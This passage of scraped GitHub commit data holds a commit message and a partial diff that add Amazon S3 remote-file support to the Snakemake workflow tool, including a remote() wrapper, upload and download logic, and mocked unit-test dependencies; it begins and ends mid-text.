`Snakefile`, and set the `provider` keyword argument, as is being done with S3 below:\n\n    import snakemake.remote_providers.S3 as S3\n\n    rule all:\n        input:\n            remote(\"bucket-name\/file.txt\", provider=S3)\n\nSince S3 is the default remote storage provider, it can be omitted from the `Snakefile`:\n\n    rule all:\n        input:\n            remote(\"bucket-name\/file.txt\")\n\nAdditional kwargs can be passed to the remote provider this way to set credentials, should you not want to rely on whichever credentials happen to be stored in the environment variables (suggestion: if using multiple buckets with different credentials, read in the key and secret within your `Snakefile` and pass as appropriate to the `remote()` wrappers). For the S3 provider, the additional kwargs are passed straight through to the boto `connect_s3()` method, so refer to the [boto docs](https:\/\/boto.readthedocs.org\/en\/latest\/ref\/s3.html#boto.s3.connection.S3Connection) to see the available parameters:\n\n    rule all:\n        input:\n            remote(\"bucket-name\/file.txt\", provider=S3, additional_kwargs={\"aws_access_key_id\":\"myKey\", \"aws_secret_access_key\":\"mySecret\"})\n\nThis can also be used to specify a custom URL to connect to rather than AWS, for a different service offering an S3-like API:\n\n    rule all:\n        input:\n            remote(\"bucket-name\/file.txt\", provider=S3, additional_kwargs={\"host\":\"mystorageapi.example.com\"})\n\nFor any storage backend with an API deviating significantly from that of S3, it may make sense to create a new remote provider.\n\nExpand still works as expected, just wrap the expansion:\n\n    rule all:\n        input:\n            remote(expand(\"bucket-name\/{letter}-2.txt\", letter=[\"A\", \"B\", \"C\"]), provider=S3)\n\nOnly remote files needed to satisfy the DAG build are downloaded for the workflow.  By default, remote files downloaded prior to rule execution and are removed locally as soon as no rules depend on them. Remote files can be explicitly kept by setting the `keep=True` keyword argument:\n\n    rule all:\n        input: remote('bucket-name\/prefix{split_id}.txt', keep=True)\n\nIf you wish to have a rule to simply download a file to a local copy, you can do so by declaring the same file path locally as is used by the remote file:\n\n    rule all:\n        input:\n            remote(\"bucket-name\/out.txt\")\n        output:\n            \"bucket-name\/out.txt\"\n        run:\n            shell(\"cp {output[0]} .\/\")\n\nHere's a brief summary of the changes. I tried to minimize the impact on existing code, relying where possible on external classes, new functions, and the use of decorators to connect them.\n\nWithin `io.py`, the usage of flags has been extended to store not just boolean values, but also objects. This is how, for example, the remote provider is passed to the `_IOFile()` object.\n\nSeveral methods of `_IOFile()` now bear a decorator \"@_referToRemote\". When called, this decorator ensures that for files flagged as `remote()`, the methods defined in the class for the remote provider are used rather than the local equivalents specified within the `_IOFile()` class of `io.py`.\n\nThe `dag.py` file has been updated to have a `handle_remote()` method that is responsible for handling remote files after job execution. It uploads files that are not remote, and removes local files flagged as remote when they are no longer needed (exception: if the `\"keep=True\"` argument is provided to `remote()`).\n\nA `decorators.py` file has been added for general-purpose decorators. Currently in use is `@decAllMethods`, which is a class decorator that applies a specified decorator to all methods of a decorated class. This is used with in the `test_remote\/` unit test to help mock out methods of `RemoteObject()`.\n\nTwo new exceptions have been added, `RemoteFileException()` and `S3FileException()`. These could probably be used more.\n\nThe `jobs.py` file has been changed to add methods related to assessing remote files for a given job. It also has two new functions used in `dag.py` `handle_remote()` to delete remote-containing directories when they are empty after purging local copies of remote files. It also adds `expanded_input()`, which is used in `handle_remote()` to help determine which wildcard\/dynamic files should be removed after job execution. The function `expanded_input()` would benefit from a critical eye.\n\nThe `rules.py` file has a small change causing newly expanded `_IOFile`s to clone the flags of their unexpanded sources. There's probably a better way.\n\nThe `workflow.py` file has been modified to import the new `glob_wildcards_remote()` helper function from `io.py`. This function is the remote analog to `glob_wildcards()`, but it needs to know the remote provider (S3 is default).\n\nA unit test has been added, `test_remote\/`. This is similar in nature to the function `test_cluster_dynamic\/`. For testing, the `moto` package is used to mock out boto, so that remote file tests do not need to hit the live S3 API.\n\nThese changes have the following dependencies (as represented in setup.py):\n* boto>=2.38.0 (for making AWS\/S3 API calls)\n* filechunkio>=1.6 (for file chunking prior to multipart upload, avoiding wheel reinvention)\n* moto>=0.4.14 (for mocking up local S3 \"buckets\" for unit testing)\n\nThis is a first pass at support for remote storage support, and feedback is welcome. The intent was to add remote file support while make minimal changes to existing Snakemake logic."}},"https:\/\/github.com\/tianyabeef\/gutMicrobiome":{"7ddb8ae8e900d19aa609ca8b97ba5f44b7844e4d":{"url":"https:\/\/api.github.com\/repos\/tianyabeef\/gutMicrobiome\/commits\/7ddb8ae8e900d19aa609ca8b97ba5f44b7844e4d","html_url":"https:\/\/github.com\/tianyabeef\/gutMicrobiome\/commit\/7ddb8ae8e900d19aa609ca8b97ba5f44b7844e4d","message":"Initial commit with support for remote files.\n\nThis introduces changes that scratch an itch within our research group for remote file support, and I hope the new functionality will be useful for others as well.\n\nWhat is it all about? Wouldn't it be wonderful if you would use Snakemake with remote data stored on Amazon S3? Imagine being able to read and write the same files as your collaborators without rsyncing files back and forth or using pricey network-attached storage. Want to output and store 1PB of small files? Want to let someone else worry about durability? Want to work with large files locally that you can store individually but that are too large in aggregate? The support for remote storage introduced with these changes will allow you do all of these things! Remote storage is initially intended to work with AWS S3 and things sporting a similar API, though it is flexible enough that would could extended it to support other remote providers. It expect you to already have an S3 bucket setup, and API credentials for it permitting read\/write access.\n\nHere's how you use it:\n\nThe `Snakefile` now supports a wrapper function, `remote()`, indicating a file is on a remote storage provider (this is similar to `temp()` or `protected()`). During rule execution, the file (or object) specified, is downloaded to the `cwd`, within a sub-directory bearing the same name as the bucket. This lets you have multiple remote origins with reduced likelihood of name collisions, and allows snakemake to easily translate remote objects to local file paths. The `remote()` wrapper is mutually-exclusive with the `temp()` and `protected()` wrappers.\n\nThe implementation of all communication with the remote storage provider is specified in a class passed as a keyword argument to the remote wrapper. This class defines methods related to being a RemoteObject(). By default, the S3 provider is used and it does not need to be specified explicitly. If you are interested in creating a custom remote storage provider for whatever system you are using, implement the methods defined in the abstract base class `snakemake.remote_providers.RemoteObjectProvider`. Take a look at the S3 provider for an example implementation. To use a custom remote storage provider implementation (FTP, etc.), import it within your `Snakefile`, and set the `provider` keyword argument, as is being done with S3 below:\n\n    import snakemake.remote_providers.S3 as S3\n\n    rule all:\n        input:\n            remote(\"bucket-name\/file.txt\", provider=S3)\n\nSince S3 is the default remote storage provider, it can be omitted from the `Snakefile`:\n\n    rule all:\n        input:\n            remote(\"bucket-name\/file.txt\")\n\nAdditional kwargs can be passed to the remote provider this way to set credentials, should you not want to rely on whichever credentials happen to be stored in the environment variables (suggestion: if using multiple buckets with different credentials, read in the key and secret within your `Snakefile` and pass as appropriate to the `remote()` wrappers). For the S3 provider, the additional kwargs are passed straight through to the boto `connect_s3()` method, so refer to the [boto docs](https:\/\/boto.readthedocs.org\/en\/latest\/ref\/s3.html#boto.s3.connection.S3Connection) to see the available parameters:\n\n    rule all:\n        input:\n            remote(\"bucket-name\/file.txt\", provider=S3, additional_kwargs={\"aws_access_key_id\":\"myKey\", \"aws_secret_access_key\":\"mySecret\"})\n\nThis can also be used to specify a custom URL to connect to rather than AWS, for a different service offering an S3-like API:\n\n    rule all:\n        input:\n            remote(\"bucket-name\/file.txt\", provider=S3, additional_kwargs={\"host\":\"mystorageapi.example.com\"})\n\nFor any storage backend with an API deviating significantly from that of S3, it may make sense to create a new remote provider.\n\nExpand still works as expected, just wrap the expansion:\n\n    rule all:\n        input:\n            remote(expand(\"bucket-name\/{letter}-2.txt\", letter=[\"A\", \"B\", \"C\"]), provider=S3)\n\nOnly remote files needed to satisfy the DAG build are downloaded for the workflow.  By default, remote files downloaded prior to rule execution and are removed locally as soon as no rules depend on them. Remote files can be explicitly kept by setting the `keep=True` keyword argument:\n\n    rule all:\n        input: remote('bucket-name\/prefix{split_id}.txt', keep=True)\n\nIf you wish to have a rule to simply download a file to a local copy, you can do so by declaring the same file path locally as is used by the remote file:\n\n    rule all:\n        input:\n            remote(\"bucket-name\/out.txt\")\n        output:\n            \"bucket-name\/out.txt\"\n        run:\n            shell(\"cp {output[0]} .\/\")\n\nHere's a brief summary of the changes. I tried to minimize the impact on existing code, relying where possible on external classes, new functions, and the use of decorators to connect them.\n\nWithin `io.py`, the usage of flags has been extended to store not just boolean values, but also objects. This is how, for example, the remote provider is passed to the `_IOFile()` object.\n\nSeveral methods of `_IOFile()` now bear a decorator \"@_referToRemote\". When called, this decorator ensures that for files flagged as `remote()`, the methods defined in the class for the remote provider are used rather than the local equivalents specified within the `_IOFile()` class of `io.py`.\n\nThe `dag.py` file has been updated to have a `handle_remote()` method that is responsible for handling remote files after job execution. It uploads files that are not remote, and removes local files flagged as remote when they are no longer needed (exception: if the `\"keep=True\"` argument is provided to `remote()`).\n\nA `decorators.py` file has been added for general-purpose decorators. Currently in use is `@decAllMethods`, which is a class decorator that applies a specified decorator to all methods of a decorated class. This is used with in the `test_remote\/` unit test to help mock out methods of `RemoteObject()`.\n\nTwo new exceptions have been added, `RemoteFileException()` and `S3FileException()`. These could probably be used more.\n\nThe `jobs.py` file has been changed to add methods related to assessing remote files for a given job. It also has two new functions used in `dag.py` `handle_remote()` to delete remote-containing directories when they are empty after purging local copies of remote files. It also adds `expanded_input()`, which is used in `handle_remote()` to help determine which wildcard\/dynamic files should be removed after job execution. The function `expanded_input()` would benefit from a critical eye.\n\nThe `rules.py` file has a small change causing newly expanded `_IOFile`s to clone the flags of their unexpanded sources. There's probably a better way.\n\nThe `workflow.py` file has been modified to import the new `glob_wildcards_remote()` helper function from `io.py`. This function is the remote analog to `glob_wildcards()`, but it needs to know the remote provider (S3 is default).\n\nA unit test has been added, `test_remote\/`. This is similar in nature to the function `test_cluster_dynamic\/`. For testing, the `moto` package is used to mock out boto, so that remote file tests do not need to hit the live S3 API.\n\nThese changes have the following dependencies (as represented in setup.py):\n* boto>=2.38.0 (for making AWS\/S3 API calls)\n* filechunkio>=1.6 (for file chunking prior to multipart upload, avoiding wheel reinvention)\n* moto>=0.4.14 (for mocking up local S3 \"buckets\" for unit testing)\n\nThis is a first pass at support for remote storage support, and feedback is welcome. The intent was to add remote file support while make minimal changes to existing Snakemake logic.","sha":"7ddb8ae8e900d19aa609ca8b97ba5f44b7844e4d","keyword":"remote code execution protect","diff":"diff --git a\/setup.py b\/setup.py\nindex dfea1dd..97f4d86 100644\n--- a\/setup.py\n+++ b\/setup.py\n@@ -59,6 +59,7 @@ def run_tests(self):\n     },\n     package_data={'': ['*.css', '*.sh', '*.html']},\n     tests_require=['nose>=1.3'],\n+    install_requires=['boto>=2.38.0','filechunkio>=1.6', 'moto>=0.4.14'],\n     cmdclass={'test': NoseTestCommand},\n     classifiers=\n     [\"Development Status :: 5 - Production\/Stable\", \"Environment :: Console\",\ndiff --git a\/snakemake\/dag.py b\/snakemake\/dag.py\nindex f1ead14..e591550 100644\n--- a\/snakemake\/dag.py\n+++ b\/snakemake\/dag.py\n@@ -10,7 +10,7 @@\n from functools import partial, lru_cache\n from operator import itemgetter, attrgetter\n \n-from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files\n+from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files, is_flagged\n from snakemake.jobs import Job, Reason\n from snakemake.exceptions import RuleException, MissingInputException\n from snakemake.exceptions import MissingRuleException, AmbiguousRuleException\n@@ -288,6 +288,51 @@ def unneeded_files():\n             logger.info(\"Removing temporary output file {}.\".format(f))\n             f.remove()\n \n+    def handle_remote(self, job):\n+        \"\"\" Remove local files if they are no longer needed, and upload to S3. \"\"\"\n+        \n+        needed = lambda job_, f: any(\n+            f in files for j, files in self.depending[job_].items()\n+            if not self.finished(j) and self.needrun(j) and j != job)\n+\n+        remote_files = set([f for f in job.expanded_input if f.is_remote]) | set([f for f in job.expanded_output if f.is_remote])\n+        local_files = set([f for f in job.input if not f.is_remote]) | set([f for f in job.expanded_output if not f.is_remote])\n+        files_to_keep = set(f for f in remote_files if is_flagged(f, \"keep\"))\n+\n+        # remove local files from list of remote files\n+        # in case the same file is specified in both places\n+        remote_files -= local_files\n+        remote_files -= files_to_keep\n+\n+        def unneeded_files():\n+            for job_, files in self.dependencies[job].items():\n+                for f in (remote_files & files):\n+                    if not needed(job_, f) and not f.protected:\n+                        yield f\n+            for f in filterfalse(partial(needed, job), [f for f in remote_files]):\n+                if not f in self.targetfiles and not f.protected:\n+                    yield f\n+\n+        def expanded_dynamic_depending_input_files():\n+            for j in self.depending[job]:    \n+                for f in j.expanded_input:\n+                    yield f\n+\n+        unneededFiles = set(unneeded_files())\n+        unneededFiles -= set(expanded_dynamic_depending_input_files())\n+\n+        for f in [f for f in job.expanded_output if f.is_remote]:\n+            if not f.exists_remote:\n+                logger.info(\"Uploading local output file to remote: {}\".format(f))\n+                f.upload_to_remote()\n+\n+        for f in set(unneededFiles):\n+            logger.info(\"Removing local output file: {}\".format(f))\n+            f.remove()\n+\n+        job.rmdir_empty_remote_dirs()\n+\n+\n     def jobid(self, job):\n         if job not in self._jobid:\n             self._jobid[job] = len(self._jobid)\ndiff --git a\/snakemake\/decorators.py b\/snakemake\/decorators.py\nnew file mode 100644\nindex 0000000..063ddde\n--- \/dev\/null\n+++ b\/snakemake\/decorators.py\n@@ -0,0 +1,31 @@\n+__author__ = \"Christopher Tomkins-Tinch\"\n+__copyright__ = \"Copyright 2015, Christopher Tomkins-Tinch\"\n+__email__ = \"tomkinsc@broadinstitute.org\"\n+__license__ = \"MIT\"\n+\n+import functools\n+import inspect\n+\n+\n+def memoize(obj):\n+    cache = obj.cache = {}\n+\n+    @functools.wraps(obj)\n+    def memoizer(*args, **kwargs):\n+        key = str(args) + str(kwargs)\n+        if key not in cache:\n+            cache[key] = obj(*args, **kwargs)\n+        return cache[key]\n+\n+    return memoizer\n+\n+\n+def decAllMethods(decorator, prefix='test_'):\n+\n+    def decClass(cls):\n+        for name, m in inspect.getmembers(cls, inspect.isfunction):\n+            if prefix == None or name.startswith(prefix):\n+                setattr(cls, name, decorator(m))\n+        return cls\n+\n+    return decClass\ndiff --git a\/snakemake\/exceptions.py b\/snakemake\/exceptions.py\nindex d606c99..7440442 100644\n--- a\/snakemake\/exceptions.py\n+++ b\/snakemake\/exceptions.py\n@@ -281,6 +281,13 @@ class IOFileException(RuleException):\n     def __init__(self, msg, lineno=None, snakefile=None):\n         super().__init__(msg, lineno=lineno, snakefile=snakefile)\n \n+class RemoteFileException(RuleException):\n+    def __init__(self, msg, lineno=None, snakefile=None):\n+        super().__init__(msg, lineno=lineno, snakefile=snakefile)\n+\n+class S3FileException(RuleException):\n+    def __init__(self, msg, lineno=None, snakefile=None):\n+        super().__init__(msg, lineno=lineno, snakefile=snakefile)\n \n class ClusterJobException(RuleException):\n     def __init__(self, job, jobid, jobscript):\ndiff --git a\/snakemake\/executors.py b\/snakemake\/executors.py\nindex 6bd0114..961e7ba 100644\n--- a\/snakemake\/executors.py\n+++ b\/snakemake\/executors.py\n@@ -109,6 +109,7 @@ def print_job_error(self, job):\n     def finish_job(self, job):\n         self.dag.handle_touch(job)\n         self.dag.check_output(job, wait=self.latency_wait)\n+        self.dag.handle_remote(job)\n         self.dag.handle_protected(job)\n         self.dag.handle_temp(job)\n \ndiff --git a\/snakemake\/io.py b\/snakemake\/io.py\nindex 0ba9cbd..3e32628 100644\n--- a\/snakemake\/io.py\n+++ b\/snakemake\/io.py\n@@ -8,11 +8,12 @@\n import stat\n import time\n import json\n+import functools\n from itertools import product, chain\n from collections import Iterable, namedtuple\n-from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError\n+from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError, RemoteFileException, S3FileException\n from snakemake.logging import logger\n-\n+import snakemake.remote_providers.S3 as S3\n \n def lstat(f):\n     return os.stat(f, follow_symlinks=os.stat not in os.supports_follow_symlinks)\n@@ -45,9 +46,46 @@ def __new__(cls, file):\n         obj._file = file\n         obj.rule = None\n         obj._regex = None\n+\n         return obj\n \n+    def __init__(self, file):\n+        self._remote_object = None\n+        if self.is_remote:\n+            additional_args = get_flag_value(self._file, \"additional_remote_args\") if get_flag_value(self._file, \"additional_remote_args\") else []\n+            additional_kwargs = get_flag_value(self._file, \"additional_remote_kwargs\") if get_flag_value(self._file, \"additional_remote_kwargs\") else {}\n+            self._remote_object = get_flag_value(self._file, \"remote_provider\").RemoteObject(self, *additional_args, **additional_kwargs)\n+        pass\n+\n+    def _referToRemote(func):\n+        \"\"\" \n+            A decorator so that if the file is remote and has a version \n+            of the same file-related function, call that version instead. \n+        \"\"\"\n+        @functools.wraps(func)\n+        def wrapper(self, *args, **kwargs):\n+            if self.is_remote:\n+                if self.remote_object:\n+                    if hasattr( self.remote_object, func.__name__):\n+                        return getattr( self.remote_object, func.__name__)(*args, **kwargs)\n+            return func(self, *args, **kwargs)\n+        return wrapper\n+\n     @property\n+    def is_remote(self):\n+        return is_flagged(self._file, \"remote\")\n+    \n+    @property\n+    def remote_object(self):\n+        if not self._remote_object:\n+            if self.is_remote:\n+               additional_kwargs = get_flag_value(self._file, \"additional_remote_kwargs\") if get_flag_value(self._file, \"additional_remote_kwargs\") else {}\n+               self._remote_object = get_flag_value(self._file, \"remote_provider\").RemoteObject(self, **additional_kwargs)\n+        return self._remote_object\n+    \n+\n+    @property\n+    @_referToRemote\n     def file(self):\n         if not self._is_function:\n             return self._file\n@@ -56,32 +94,74 @@ def file(self):\n                              \"may not be used directly.\")\n \n     @property\n+    @_referToRemote\n     def exists(self):\n         return os.path.exists(self.file)\n \n     @property\n-    def protected(self):\n-        return self.exists and not os.access(self.file, os.W_OK)\n+    def exists_local(self):\n+        return os.path.exists(self.file)\n+\n+    @property\n+    def exists_remote(self):\n+        return (self.is_remote and self.remote_object.exists())\n+    \n \n     @property\n+    def protected(self):\n+        return self.exists_local and not os.access(self.file, os.W_OK)\n+    \n+    @property\n+    @_referToRemote\n     def mtime(self):\n+        return lstat(self.file).st_mtime\n+\n+    @property\n+    def flags(self):\n+        return getattr(self._file, \"flags\", {})\n+\n+    @property\n+    def mtime_local(self):\n         # do not follow symlinks for modification time\n         return lstat(self.file).st_mtime\n \n     @property\n+    @_referToRemote\n     def size(self):\n         # follow symlinks but throw error if invalid\n         self.check_broken_symlink()\n         return os.path.getsize(self.file)\n \n+    @property\n+    def size_local(self):\n+        # follow symlinks but throw error if invalid\n+        self.check_broken_symlink()\n+        return os.path.getsize(self.file)\n+\n     def check_broken_symlink(self):\n         \"\"\" Raise WorkflowError if file is a broken symlink. \"\"\"\n-        if not self.exists and lstat(self.file):\n+        if not self.exists_local and lstat(self.file):\n             raise WorkflowError(\"File {} seems to be a broken symlink.\".format(self.file))\n \n     def is_newer(self, time):\n         return self.mtime > time\n \n+    def download_from_remote(self):\n+        logger.info(\"Downloading from remote: {}\".format(self.file))\n+\n+        if self.is_remote and self.remote_object.exists():\n+            self.remote_object.download()\n+        else:\n+            raise RemoteFileException(\"The file to be downloaded does not seem to exist remotely.\")\n+ \n+    def upload_to_remote(self):\n+        logger.info(\"Uploading to remote: {}\".format(self.file))\n+\n+        if self.is_remote and not self.remote_object.exists():\n+            self.remote_object.upload()\n+        else:\n+            raise RemoteFileException(\"The file to be uploaded does not seem to exist remotely.\")\n+\n     def prepare(self):\n         path_until_wildcard = re.split(self.dynamic_fill, self.file)[0]\n         dir = os.path.dirname(path_until_wildcard)\n@@ -108,9 +188,10 @@ def protect(self):\n     def remove(self):\n         remove(self.file)\n \n-    def touch(self):\n+    def touch(self, times=None):\n+        \"\"\" times must be 2-tuple: (atime, mtime) \"\"\"\n         try:\n-            lutime(self.file, None)\n+            lutime(self.file, times)\n         except OSError as e:\n             if e.errno == 2:\n                 raise MissingOutputException(\n@@ -136,11 +217,21 @@ def apply_wildcards(self, wildcards,\n         if self._is_function:\n             f = self._file(Namedlist(fromdict=wildcards))\n \n-        return IOFile(apply_wildcards(f, wildcards,\n+        # this bit ensures flags are transferred over to files after\n+        # wildcards are applied\n+\n+        flagsBeforeWildcardResolution = getattr(f, \"flags\", {})\n+\n+\n+        fileWithWildcardsApplied = IOFile(apply_wildcards(f, wildcards,\n                                       fill_missing=fill_missing,\n                                       fail_dynamic=fail_dynamic,\n                                       dynamic_fill=self.dynamic_fill),\n-                      rule=self.rule)\n+                                      rule=self.rule)\n+\n+        fileWithWildcardsApplied.set_flags(getattr(f, \"flags\", {}))\n+\n+        return fileWithWildcardsApplied\n \n     def get_wildcard_names(self):\n         return get_wildcard_names(self.file)\n@@ -166,6 +257,17 @@ def match(self, target):\n     def format_dynamic(self):\n         return self.replace(self.dynamic_fill, \"{*}\")\n \n+    def clone_flags(self, other):\n+        if isinstance(self._file, str):\n+            self._file = AnnotatedString(self._file)\n+        if isinstance(other._file, AnnotatedString):\n+            self._file.flags = getattr(other._file, \"flags\", {})\n+\n+    def set_flags(self, flags):\n+        if isinstance(self._file, str):\n+            self._file = AnnotatedString(self._file)\n+        self._file.flags = flags\n+\n     def __eq__(self, other):\n         f = other._file if isinstance(other, _IOFile) else other\n         return self._file == f\n@@ -286,9 +388,17 @@ def flag(value, flag_type, flag_value=True):\n \n def is_flagged(value, flag):\n     if isinstance(value, AnnotatedString):\n-        return flag in value.flags\n+        return flag in value.flags and value.flags[flag]\n+    if isinstance(value, _IOFile):\n+        return flag in value.flags and value.flags[flag]\n     return False\n \n+def get_flag_value(value, flag_type):\n+    if isinstance(value, AnnotatedString):\n+        if flag_type in value.flags:\n+            return value.flags[flag_type]\n+        else:\n+            return None\n \n def temp(value):\n     \"\"\"\n@@ -297,6 +407,9 @@ def temp(value):\n     if is_flagged(value, \"protected\"):\n         raise SyntaxError(\n             \"Protected and temporary flags are mutually exclusive.\")\n+    if is_flagged(value, \"remote\"):\n+        raise SyntaxError(\n+            \"Remote and temporary flags are mutually exclusive.\")\n     return flag(value, \"temp\")\n \n \n@@ -310,6 +423,9 @@ def protected(value):\n     if is_flagged(value, \"temp\"):\n         raise SyntaxError(\n             \"Protected and temporary flags are mutually exclusive.\")\n+    if is_flagged(value, \"remote\"):\n+        raise SyntaxError(\n+            \"Remote and protected flags are mutually exclusive.\")\n     return flag(value, \"protected\")\n \n \n@@ -318,7 +434,7 @@ def dynamic(value):\n     A flag for a file that shall be dynamic, i.e. the multiplicity\n     (and wildcard values) will be expanded after a certain\n     rule has been run \"\"\"\n-    annotated = flag(value, \"dynamic\")\n+    annotated = flag(value, \"dynamic\", True)\n     tocheck = [annotated] if not_iterable(annotated) else annotated\n     for file in tocheck:\n         matches = list(_wildcard_regex.finditer(file))\n@@ -334,6 +450,36 @@ def dynamic(value):\n def touch(value):\n     return flag(value, \"touch\")\n \n+def remote(value, provider=S3, keep=False, additional_args=None, additional_kwargs=None):\n+\n+    additional_args = [] if not additional_args else additional_args\n+    additional_kwargs = {} if not additional_kwargs else additional_kwargs\n+\n+    if not provider:\n+        raise RemoteFileException(\"Provider (S3, etc.) must be specified for remote file as kwarg.\")\n+    if is_flagged(value, \"temp\"):\n+        raise SyntaxError(\n+            \"Remote and temporary flags are mutually exclusive.\")\n+    if is_flagged(value, \"protected\"):\n+        raise SyntaxError(\n+            \"Remote and protected flags are mutually exclusive.\")\n+    return flag(\n+                flag(\n+                    flag( \n+                        flag( \n+                            flag(value, \"remote\"), \n+                            \"remote_provider\", \n+                            provider\n+                        ), \n+                        \"additional_remote_kwargs\", \n+                        additional_kwargs\n+                    ),\n+                    \"additional_remote_args\",\n+                    additional_args\n+                ),\n+                \"keep\",\n+                keep\n+            )\n \n def expand(*args, **wildcards):\n     \"\"\"\n@@ -410,6 +556,31 @@ def glob_wildcards(pattern):\n                     getattr(wildcards, name).append(value)\n     return wildcards\n \n+def glob_wildcards_remote(pattern, provider=S3, additional_kwargs=None):\n+    additional_kwargs = additional_kwargs if additional_kwargs else {}\n+    referenceObj = IOFile(remote(pattern, provider=provider, **additional_kwargs))\n+    key_list = [k.name for k in referenceObj._remote_object.list] \n+\n+    pattern = \".\/\"+ referenceObj._remote_object.name\n+    pattern = os.path.normpath(pattern)\n+    first_wildcard = re.search(\"{[^{]\", pattern)\n+    dirname = os.path.dirname(pattern[:first_wildcard.start(\n+    )]) if first_wildcard else os.path.dirname(pattern)\n+    if not dirname:\n+        dirname = \".\"\n+\n+    names = [match.group('name')\n+             for match in _wildcard_regex.finditer(pattern)]\n+    Wildcards = namedtuple(\"Wildcards\", names)\n+    wildcards = Wildcards(*[list() for name in names])\n+\n+    pattern = re.compile(regex(pattern))\n+    for f in key_list:\n+        match = re.match(pattern, f)\n+        if match:\n+            for name, value in match.groupdict().items():\n+                getattr(wildcards, name).append(value)\n+    return wildcards\n \n # TODO rewrite Namedlist!\n class Namedlist(list):\ndiff --git a\/snakemake\/jobs.py b\/snakemake\/jobs.py\nindex fdba8b5..317c7c4 100644\n--- a\/snakemake\/jobs.py\n+++ b\/snakemake\/jobs.py\n@@ -13,7 +13,7 @@\n from functools import partial\n from operator import attrgetter\n \n-from snakemake.io import IOFile, Wildcards, Resources, _IOFile\n+from snakemake.io import IOFile, Wildcards, Resources, _IOFile, is_flagged, contains_wildcard\n from snakemake.utils import format, listfiles\n from snakemake.exceptions import RuleException, ProtectedOutputException\n from snakemake.exceptions import UnexpectedOutputException\n@@ -131,7 +131,40 @@ def expanded_output(self):\n                 if not expansion:\n                     yield f_\n                 for f, _ in expansion:\n-                    yield IOFile(f, self.rule)\n+                    fileToYield = IOFile(f, self.rule)\n+\n+                    fileToYield.clone_flags(f_)\n+\n+                    yield fileToYield\n+            else:\n+                yield f\n+\n+    @property\n+    def expanded_input(self):\n+        \"\"\" Iterate over input files while dynamic output is expanded. \"\"\"\n+\n+        for f, f_ in zip(self.input, self.rule.input):\n+            if not type(f_).__name__ == \"function\":\n+                if type(f_.file).__name__ not in [\"str\", \"function\"]:\n+                    if contains_wildcard(f_):\n+\n+                        expansion = self.expand_dynamic(\n+                            f_,\n+                            restriction=self.wildcards,\n+                            omit_value=_IOFile.dynamic_fill)\n+                        if not expansion:\n+                            yield f_\n+                        for f, _ in expansion:\n+\n+                            fileToYield = IOFile(f, self.rule)\n+\n+                            fileToYield.clone_flags(f_)\n+\n+                            yield fileToYield\n+                    else:\n+                        yield f\n+                else:\n+                    yield f\n             else:\n                 yield f\n \n@@ -159,6 +192,34 @@ def missing_input(self):\n         return set(f for f in self.input\n                    if not f.exists and not f in self.subworkflow_input)\n \n+\n+    @property\n+    def present_remote_input(self):\n+        files = set()\n+\n+        for f in self.input:\n+            if f.is_remote:\n+                if f.exists_remote:\n+                    files.add(f)\n+        return files\n+    \n+    @property\n+    def present_remote_output(self):\n+        files = set()\n+\n+        for f in self.remote_output:\n+            if f.exists_remote:\n+                files.add(f)\n+        return files\n+\n+    @property\n+    def missing_remote_input(self):\n+        return self.remote_input - self.present_remote_input\n+\n+    @property\n+    def missing_remote_output(self):\n+        return self.remote_output - self.present_remote_output\n+\n     @property\n     def output_mintime(self):\n         \"\"\" Return oldest output file. \"\"\"\n@@ -197,6 +258,74 @@ def missing_output(self, requested=None):\n                     files.add(f)\n         return files\n \n+\n+    @property\n+    def remote_input(self):\n+        for f in self.input:\n+            if f.is_remote:\n+                yield f\n+\n+    @property\n+    def remote_output(self):\n+        for f in self.output:\n+            if f.is_remote:\n+                yield f\n+\n+    @property\n+    def remote_input_newer_than_local(self):\n+        files = set()\n+        for f in self.remote_input:\n+            if (f.exists_remote and f.exists_local) and (f.mtime > f.mtime_local):\n+                files.add(f)\n+        return files\n+\n+    @property\n+    def remote_input_older_than_local(self):\n+        files = set()\n+        for f in self.remote_input:\n+            if (f.exists_remote and f.exists_local) and (f.mtime < f.mtime_local):\n+                files.add(f)\n+        return files\n+\n+    @property\n+    def remote_output_newer_than_local(self):\n+        files = set()\n+        for f in self.remote_output:\n+            if (f.exists_remote and f.exists_local) and (f.mtime > f.mtime_local):\n+                files.add(f)\n+        return files\n+\n+    @property\n+    def remote_output_older_than_local(self):\n+        files = set()\n+        for f in self.remote_output:\n+            if (f.exists_remote and f.exists_local) and (f.mtime < f.mtime_local):\n+                files.add(f)\n+        return files\n+\n+    def transfer_updated_files(self):\n+        for f in self.remote_output_older_than_local | self.remote_input_older_than_local:\n+            f.upload_to_remote()\n+\n+        for f in self.remote_output_newer_than_local | self.remote_input_newer_than_local:\n+            f.download_from_remote()\n+    \n+    @property\n+    def files_to_download(self):\n+        toDownload = set()\n+\n+        for f in self.input:\n+            if f.is_remote:\n+                if not f.exists_local and f.exists_remote:\n+                    toDownload.add(f)\n+\n+        toDownload = toDownload | self.remote_input_newer_than_local\n+        return toDownload\n+\n+    @property\n+    def files_to_upload(self):\n+        return self.missing_remote_input & self.remote_input_older_than_local\n+\n     @property\n     def existing_output(self):\n         return filter(lambda f: f.exists, self.expanded_output)\n@@ -231,6 +360,10 @@ def prepare(self):\n                 os.remove(f)\n         for f, f_ in zip(self.output, self.rule.output):\n             f.prepare()\n+\n+        for f in self.files_to_download:\n+            f.download_from_remote()\n+\n         for f in self.log:\n             f.prepare()\n         if self.benchmark:\n@@ -239,6 +372,8 @@ def prepare(self):\n     def cleanup(self):\n         \"\"\" Cleanup output files. \"\"\"\n         to_remove = [f for f in self.expanded_output if f.exists]\n+\n+        to_remove.extend([f for f in self.remote_input if f.exists])\n         if to_remove:\n             logger.info(\"Removing output files of failed job {}\"\n                         \" since they might be corrupted:\\n{}\".format(\n@@ -246,6 +381,23 @@ def cleanup(self):\n             for f in to_remove:\n                 f.remove()\n \n+            self.rmdir_empty_remote_dirs()\n+\n+    @property\n+    def empty_remote_dirs(self):\n+        remote_files = [f for f in (set(self.output) | set(self.input)) if f.is_remote]\n+        emptyDirsToRemove = set(os.path.dirname(f) for f in remote_files if not len(os.listdir(os.path.dirname(f))))\n+        return emptyDirsToRemove\n+\n+    def rmdir_empty_remote_dirs(self):\n+        for d in self.empty_remote_dirs:\n+            pathToDel = d\n+            while len(pathToDel) > 0 and len(os.listdir(pathToDel)) == 0:\n+                logger.info(\"rmdir empty dir: {}\".format(pathToDel))\n+                